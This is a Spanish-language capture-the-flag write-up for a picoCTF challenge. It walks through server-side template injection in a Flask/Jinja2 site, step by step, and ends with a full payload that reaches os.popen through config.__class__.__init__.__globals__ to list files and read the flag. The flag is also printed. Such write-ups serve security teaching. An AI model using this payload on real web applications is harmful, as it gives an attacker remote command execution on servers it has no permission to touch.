# **Descripción**

I made a cool website where you can announce whatever you want! Try it out!I heard templating is a cool and modular way to build web apps! Check out my website [here](http://rescued-float.picoctf.net:58435/)!
# **Solución**

Al ingresar al sitio notamos que existe un formulario donde nos dice que queremos anunciar, por la descripción sabemos que esta página está utilizando plantillas.

Como el sitio es de python, normalmente utiliza platillas Jinja, por tanto vamos a inyectar estas plantillas desde el lado del servidor.

Revisamos si la platilla es maleable, mandamos *{{3x3}}* al formulario y la respuesta será 9, por tanto es maleable.

Ahora mandamos un payload para ver si es evaluado.

```
{{''.__class__}}
```
Nos arroja lo siguiente.

```
# <class 'str'>
```
Por tanto es evaluado.

Ahora, podemos construir payloads mas complejos, a partir de esto vamos a obtener la clase del objeto config, ya que en aplicaciones flask, config es una instancia típica de config, que está heredada de una clase base.

Mandamos *{{config.__class__}}*, que nos da como resultado *<class 'flask.config.Config'>*.

Ahora accedemos al método init de la clase config con *{{config.__class__.__init__}}* como si nos devuelve algo, podemos seguir agrandando nuestro payload.

Ahora extraemos las variables globales disponibles para *init*, esto porque regularmente incluye algunos módulos python integrados como OS, la cual es la que nos puede ayudar a ejecutar comandos de manera remota.

Mandamos *{{config.__class__.__init__.__globals__}}* la cual si nos retorna el modulo OS, por tanto ahora pediremos la dirección del ámbito de ese método con *{{config.__class__.__init__.__globals__['os']}}* esto nos arroja que sí está disponible, por tanto sólo utilizaremos *os.popen()* para ejecutar comandos en shell.

Al ejecutar *{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}* nos muestra los siguientes archivos: app.py, flag y requirements.txt.

Por tanto ahora haremos un cat a flag de la siguiente manera.

```
{{config.__class__.__init__.__globals__['os'].popen('cat flag').read()}} 
```
```
# picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_753eca43}
```

Obteniendo así la bandera

# **Notas adicionales**

# **Referencias**
